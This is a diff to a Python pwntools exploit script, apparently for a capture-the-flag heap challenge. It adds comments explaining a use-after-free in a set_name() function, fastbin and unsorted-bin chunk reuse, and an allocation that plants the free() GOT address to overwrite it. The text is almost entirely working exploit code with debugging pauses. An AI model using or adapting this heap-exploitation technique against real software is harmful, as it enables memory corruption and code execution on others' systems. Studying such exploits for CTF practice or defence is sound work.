@@ -62,23 +62,30 @@ def hex_dump(s):
 if __name__ == "__main__":
     r.recvuntil('Your choice:')
 
-    add('A'*200, 0xc7)
-    add('B'*200, 0xc8)
-    add('C'*200, 0xc9)
+    add('A'*200, 0xc7) # chunk A-1,A-2
+    add('B'*200, 0xc8) # chunk B-1,B-2
+    add('C'*200, 0xc9) # chunk C-1,C-2
     raw_input('after adding ABC...')
 
     select(0)
 
     remove(0)
+    raw_input('after removing A...')
     remove(1)
-    remove(2)
-    raw_input('after removing ABC...')
+    raw_input('after removing B...')
 
+    # chunk C-2 gets merged with top_chunk
+    # chunk C-1 goes into fastbin
+    remove(2)                           
+    raw_input('after removing C...')
+
+    # set_name() references the variable 'selected' even after the chunk has gone! (UaF)
+    # -> strcpy(*(char **)(selected + 16), &s);
     #
-    # typedef _player_st { DWORD attack, defense, speed, precision; char * name } player_st;
-    # malloc(sizeof(player_st)) -> 24 bytes -> LIFO fastbin
-    # malloc(name) -> 16+3 bytes -> unsorted bin
-    #
+    # typedef _player_st { _DWORD attack, defense, speed, precision; char * name } player_st;
+    # -> malloc(sizeof(player_st)) -> 24 bytes from LIFO fastbin (previous chunk C-1)
+    # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
+
     add('E'*16 + p64(b.got['free']), 0xfe)
     raw_input('after adding E...')
 
